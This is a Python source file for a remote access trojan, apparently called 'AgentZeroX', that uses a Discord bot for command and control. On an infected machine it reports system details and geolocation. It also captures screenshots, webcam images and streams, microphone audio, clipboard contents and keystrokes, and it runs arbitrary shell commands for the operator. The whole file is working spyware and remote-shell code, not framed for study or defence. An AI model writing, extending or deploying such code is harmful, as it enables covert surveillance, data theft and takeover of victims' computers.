import os
import sys
import socket
import platform
import subprocess
import threading
import requests
import json
import time
import cv2
import discord
import pyautogui
import sounddevice as sd
import numpy as np
import win32clipboard
from datetime import datetime
from pynput import keyboard
from PIL import ImageGrab
from discord.ext import commands
import asyncio

# ======================== CONFIGURATION ========================
TOKEN = "DISCORD TOKEN HERE"
CHANNEL_ID = DISCORD CHANNEL ID HERE  # e.g. 1153102219212102913  
PREFIX = "!"
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

# ======================== UTILITIES ============================
def get_ip_info():
    try:
        ip = requests.get("https://api.ipify.org").text
        geo = requests.get(f"https://ipinfo.io/{ip}/json").json()
        return ip, geo
    except:
        return "N/A", {}

def get_geolocation():
    ip, geo = get_ip_info()
    loc = geo.get("loc", "0,0").split(",")
    city = geo.get("city", "Unknown")
    region = geo.get("region", "Unknown")
    country = geo.get("country", "Unknown")
    return f"{city}, {region}, {country} (Lat,Lon: {loc[0]}, {loc[1]})"

def get_system_info():
    return f"""
🖥️ Hostname: {socket.gethostname()}
👤 User: {os.getlogin()}
💻 OS: {platform.system()} {platform.release()}
🌐 Public IP: {get_ip_info()[0]}
📍 Location: {get_geolocation()}
🕒 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""

def capture_webcam():
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cam.release()
    if ret:
        path = "webcam.jpg"
        cv2.imwrite(path, frame)
        return path
    return None

def capture_screen():
    image = pyautogui.screenshot()
    path = "screenshot.png"
    image.save(path)
    return path

def record_audio(seconds=5):
    fs = 44100
    rec = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    path = "voice.wav"
    sd.write(path, rec, fs)
    return path

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return "Clipboard access failed."

def execute_command(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
    except Exception as e:
        return str(e)

# ======================== BOT EVENTS ===========================
@bot.event
async def on_ready():
    channel = bot.get_channel(CHANNEL_ID)
    await channel.send("🟢 AgentZeroX connected.")
    await channel.send(get_system_info())

# ======================== BOT COMMANDS =========================
@bot.command()
async def screen(ctx):
    path = capture_screen()
    await ctx.send(file=discord.File(path))
    os.remove(path)

@bot.command()
async def webcam(ctx):
    path = capture_webcam()
    if path:
        await ctx.send(file=discord.File(path))
        os.remove(path)
    else:
        await ctx.send("❌ Webcam access failed.")

@bot.command()
async def livestream(ctx, frames: int = 10, delay: float = 1.0):
    await ctx.send(f"📡 Starting webcam stream for {frames} frames...")
    cam = cv2.VideoCapture(0)
    for i in range(frames):
        ret, frame = cam.read()
        if not ret:
            break
        path = f"frame_{i}.jpg"
        cv2.imwrite(path, frame)
        await ctx.send(file=discord.File(path))
        os.remove(path)
        await asyncio.sleep(delay)
    cam.release()
    await ctx.send("✅ Stream ended.")

@bot.command()
async def voice(ctx, seconds: int = 5):
    path = record_audio(seconds)
    await ctx.send(file=discord.File(path))
    os.remove(path)

@bot.command()
async def clipboard(ctx):
    clip = get_clipboard()
    await ctx.send(f"📋 Clipboard:\n```{clip}```")

@bot.command()
async def shell(ctx, *, cmd):
    output = execute_command(cmd)
    await ctx.send(f"💻 Output:\n```{output[:1900]}```")

@bot.command()
async def geo(ctx):
    await ctx.send(f"📍 {get_geolocation()}")

@bot.command()
async def info(ctx):
    await ctx.send(get_system_info())

# ======================== KEYLOGGER ============================
keys = []
@bot.command()
async def keylog(ctx):
    def on_press(key):
        try:
            keys.append(key.char)
        except:
            keys.append(str(key))
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    time.sleep(10)
    listener.stop()
    await ctx.send("⌨️ Keystrokes:\n```" + ''.join(keys[-100:]) + "```")

# ======================== RUN BOT ==============================
bot.run(TOKEN)
